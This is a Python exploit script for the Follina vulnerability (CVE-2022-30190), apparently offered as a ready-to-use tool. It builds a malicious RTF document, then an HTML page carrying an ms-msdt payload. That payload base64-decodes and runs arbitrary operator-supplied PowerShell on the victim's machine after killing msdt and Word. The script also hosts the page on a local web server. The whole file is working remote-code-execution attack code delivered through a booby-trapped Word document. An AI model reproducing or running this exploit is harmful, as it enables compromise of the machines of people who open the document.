import sys
import zipfile
import os
import base64
import http.server
import socketserver

help_text = '''CVE-2022-30190 Follina Exploit Script

Usage:
python3 follina.py {host ip} {host port} {powershell command(s)}

Host IP: The ip where the malicous HTML file will be hosted

Host Port: The port where the malicous HTML file with be hosted

PowerShell Command(s): The command(s) the exploit should run when the word document is opened
'''

def rtf(url):
	with open("templates/rtf.template", "r") as f:
		document_temp = f.read()

	temp = url
	docuri_hex = "".join("{:02x}".format(ord(c)) for c in temp)
	docuri_hex_wide = "00".join("{:02x}".format(ord(c)) for c in temp)
	url_moniker_length = (int(len(docuri_hex_wide)/2)+3+24)
	url_moniker_length_encoded = f"{url_moniker_length:x}"
	composite_moniker_length = int(len(docuri_hex_wide)/2)+3+95 
	composite_moniker_length_encoded = f"{composite_moniker_length:x}"
	null_padding_ole_object = "00"*(196-int(len(docuri_hex_wide)/2))
	null_padding_link_object = "00"*(565-int(len(docuri_hex_wide)/2)-int(len(docuri_hex)/2))

	payload_rtf = document_temp.replace('payload_url_deobf', url)
	payload_rtf = payload_rtf.replace('{payload_url_hex}', docuri_hex)
	payload_rtf = payload_rtf.replace('{composite_moniker_length_encoded}', composite_moniker_length_encoded)
	payload_rtf = payload_rtf.replace('{url_moniker_length_encoded}', url_moniker_length_encoded)
	payload_rtf = payload_rtf.replace('{payload_url_wide}', docuri_hex_wide)
	payload_rtf = payload_rtf.replace('{null_padding_ole_object}', null_padding_ole_object)
	payload_rtf = payload_rtf.replace('{null_padding_link_object}', null_padding_link_object)

	with open('output/maldoc.rtf', "w") as f:
		f.write(payload_rtf)

def main():
	if (len(sys.argv) != 4):
		print("Wrong amounts of arguments please refer to the bellow on how to use the script:")
		print(help_text)
		exit()

	payload_url = f"http://{sys.argv[1]}:{sys.argv[2]}/mal.html"
	rtf(payload_url)
	# print(payload_url)

	#payload will close both msdt and word and execute the user specified payload
	cmd = 'taskkill /f /im msdt.exe;taskkill /f /im WINWORD.exe;'+sys.argv[3]
	print(cmd)
	cmd_e = base64.b64encode(bytearray(cmd, 'utf-16-le')).decode('UTF-8')
	#payload from https://twitter.com/nao_sec/status/1530196847679401984/photo/1
	payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{cmd_e}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\""'''

	with open("templates/webpage.template", "r") as f:
		html_template = f.read()

	modified_html = html_template.format(payload = payload)

	with open("webserver/mal.html", "w") as f:
		f.write(modified_html)

	print("Generated HTML and RTF file")


	class Handler(http.server.SimpleHTTPRequestHandler):
		def __init__(self, *args, **kwargs):
			super().__init__(*args, directory='webserver', **kwargs)


	with socketserver.TCPServer((sys.argv[1], int(sys.argv[2])), Handler) as httpd:
		print("serving at port", int(sys.argv[2]))
		httpd.serve_forever()

if __name__ == "__main__":
	main()